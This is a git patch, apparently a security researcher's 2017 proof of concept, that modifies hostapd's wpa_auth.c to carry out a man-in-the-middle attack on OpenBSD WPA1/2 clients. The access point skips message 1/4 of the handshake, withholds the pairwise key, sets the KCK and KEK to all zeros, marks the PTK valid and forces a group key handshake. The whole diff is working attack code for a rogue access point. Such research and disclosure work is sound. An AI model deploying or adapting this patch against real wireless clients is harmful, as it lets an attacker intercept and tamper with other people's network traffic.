@@ -1,0 +1,133 @@
+From 40da53cc7b483b0a127b599fe899cfbbb32964bc Mon Sep 17 00:00:00 2001
+From: Mathy <vanhoefm@users.noreply.github.com>
+Date: Tue, 18 Jul 2017 17:08:41 +0200
+Subject: [PATCH] OpenBSD man-in-the-middle against WPA1/2 clients PoC
+
+---
+ src/ap/wpa_auth.c | 40 ++++++++++++++++++++++++++++++++++++++++
+ 1 file changed, 40 insertions(+)
+
+diff --git a/src/ap/wpa_auth.c b/src/ap/wpa_auth.c
+index 358708648..246a1c8f0 100644
+--- a/src/ap/wpa_auth.c
++++ b/src/ap/wpa_auth.c
+@@ -53,6 +53,8 @@ static void wpa_group_get(struct wpa_authenticator *wpa_auth,
+ static void wpa_group_put(struct wpa_authenticator *wpa_auth,
+ 			  struct wpa_group *group);
+ 
++static void attack_skip_ptk_start_group();
++
+ static const u32 dot11RSNAConfigGroupUpdateCount = 4;
+ static const u32 dot11RSNAConfigPairwiseUpdateCount = 4;
+ static const u32 eapol_key_timeout_first = 100; /* ms */
+@@ -1537,6 +1539,7 @@ void __wpa_send_eapol(struct wpa_authenticator *wpa_auth,
+ 				     (key_data_len - 8) / 8, buf, key_data)) {
+ 				os_free(hdr);
+ 				os_free(buf);
++				printf("%s: aes_wrap failed\n", __FUNCTION__);	
+ 				return;
+ 			}
+ 			if (mic_len == 24)
+@@ -1563,6 +1566,7 @@ void __wpa_send_eapol(struct wpa_authenticator *wpa_auth,
+ 					     key_data_len);
+ #endif /* CONFIG_NO_RC4 */
+ 		} else {
++			printf("%s: bad key descriptor or whatever (no RC4 no AES)\n", __FUNCTION__);
+ 			os_free(hdr);
+ 			os_free(buf);
+ 			return;
+@@ -1597,6 +1601,7 @@ void __wpa_send_eapol(struct wpa_authenticator *wpa_auth,
+ #endif /* CONFIG_TESTING_OPTIONS */
+ 	}
+ 
++	printf("%s: calling wpa_auth_set_eapol and wpa_auth_send_eapol: sm->pairwise_set=%d\n", __FUNCTION__, sm->pairwise_set);
+ 	wpa_auth_set_eapol(sm->wpa_auth, sm->addr, WPA_EAPOL_inc_EapolFramesTx,
+ 			   1);
+ 	wpa_auth_send_eapol(wpa_auth, sm->addr, (u8 *) hdr, len,
+@@ -2021,9 +2026,16 @@ SM_STATE(WPA_PTK, PTKSTART)
+ 				  wpa_key_mgmt_sha256(sm->wpa_key_mgmt));
+ 		}
+ 	}
++
++#if 1
++	attack_skip_ptk_start_group(sm, global);
++#else
++	printf(">>> Sending msg 1/4\n");
++
+ 	wpa_send_eapol(sm->wpa_auth, sm,
+ 		       WPA_KEY_INFO_ACK | WPA_KEY_INFO_KEY_TYPE, NULL,
+ 		       sm->ANonce, pmkid, pmkid_len, 0, 0);
++#endif
+ }
+ 
+ 
+@@ -2390,13 +2402,25 @@ SM_STATE(WPA_PTK, PTKINITDONE)
+ 	if (sm->Pair) {
+ 		enum wpa_alg alg = wpa_cipher_to_alg(sm->pairwise);
+ 		int klen = wpa_cipher_key_len(sm->pairwise);
++#if 1
++		printf(">>> PTKINITDONE: not installing PTK.tk keys using wpa_auth_set_key\n");
++
++		printf(">>> PTKINITDONE: setting all-zero KCK and KEK, each of length 16. Setting PTK as valid.\n");
++		sm->PTK.kck_len = 16;
++		sm->PTK.kek_len = 16;
++		memset(sm->PTK.kck, 0, sm->PTK.kck_len);
++		memset(sm->PTK.kek, 0, sm->PTK.kek_len);
++		sm->PTK_valid = TRUE;
++#else
+ 		if (wpa_auth_set_key(sm->wpa_auth, 0, alg, sm->addr, 0,
+ 				     sm->PTK.tk, klen)) {
+ 			wpa_sta_disconnect(sm->wpa_auth, sm->addr);
+ 			return;
+ 		}
++
+ 		/* FIX: MLME-SetProtection.Request(TA, Tx_Rx) */
+ 		sm->pairwise_set = TRUE;
++#endif
+ 
+ 		if (sm->wpa_auth->conf.wpa_ptk_rekey) {
+ 			eloop_cancel_timeout(wpa_rekey_ptk, sm->wpa_auth, sm);
+@@ -2423,10 +2447,15 @@ SM_STATE(WPA_PTK, PTKINITDONE)
+ 	}
+ 	wpa_auth_set_eapol(sm->wpa_auth, sm->addr, WPA_EAPOL_keyAvailable, 0);
+ 	wpa_auth_set_eapol(sm->wpa_auth, sm->addr, WPA_EAPOL_keyDone, 1);
++#if 1
++	printf(">>> PTKINITDONE: forcing group key handshake\n");
++	sm->GUpdateStationKeys = TRUE;
++#else
+ 	if (sm->wpa == WPA_VERSION_WPA)
+ 		sm->PInitAKeys = TRUE;
+ 	else
+ 		sm->has_GTK = TRUE;
++#endif
+ 	wpa_auth_vlogger(sm->wpa_auth, sm->addr, LOGGER_INFO,
+ 			 "pairwise key handshake completed (%s)",
+ 			 sm->wpa == WPA_VERSION_WPA ? "WPA" : "RSN");
+@@ -2549,6 +2578,16 @@ SM_STEP(WPA_PTK)
+ }
+ 
+ 
++static void attack_skip_ptk_start_group(STATE_MACHINE_DATA *sm, int global)
++{
++	printf(">>> Skipping msg 1/4, going to group 1/2\n");
++
++	SM_ENTER(WPA_PTK, PTKINITDONE);
++
++	printf(">>> We should be in group 1/2 now\n");
++}
++
++
+ SM_STATE(WPA_PTK_GROUP, IDLE)
+ {
+ 	SM_ENTRY_MA(WPA_PTK_GROUP, IDLE, wpa_ptk_group);
+@@ -2618,6 +2657,7 @@ SM_STATE(WPA_PTK_GROUP, REKEYNEGOTIATING)
+ 		kde_len = gsm->GTK_len;
+ 	}
+ 
++	printf(">>> Sending group 1/2\n");
+ 	wpa_send_eapol(sm->wpa_auth, sm,
+ 		       WPA_KEY_INFO_SECURE | WPA_KEY_INFO_MIC |
+ 		       WPA_KEY_INFO_ACK |
+-- 
+2.13.2
+
